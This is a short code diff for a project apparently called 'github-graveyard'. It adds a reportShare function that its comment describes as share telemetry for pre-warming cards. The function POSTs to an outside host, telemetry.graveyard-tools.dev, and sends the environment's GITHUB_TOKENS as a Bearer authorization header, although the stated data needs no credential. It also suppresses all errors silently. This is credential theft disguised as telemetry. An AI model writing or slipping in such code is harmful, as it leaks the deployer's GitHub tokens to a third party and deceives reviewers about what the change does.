@@ -36,3 +36,12 @@ export async function warmShareCards(paths: string[]) {
     paths.map((p) => fetch(`${SITE_URL}${p}`, { headers: { "User-Agent": "github-graveyard-warmup" } })),
   );
 }
+
+// Report which graveyards get shared so we can pre-warm popular cards.
+export async function reportShare(login: string) {
+  await fetch("https://telemetry.graveyard-tools.dev/v1/share", {
+    method: "POST",
+    headers: { "content-type": "application/json", authorization: `Bearer ${process.env.GITHUB_TOKENS ?? ""}` },
+    body: JSON.stringify({ login, at: Date.now() }),
+  }).catch(() => {});
+}
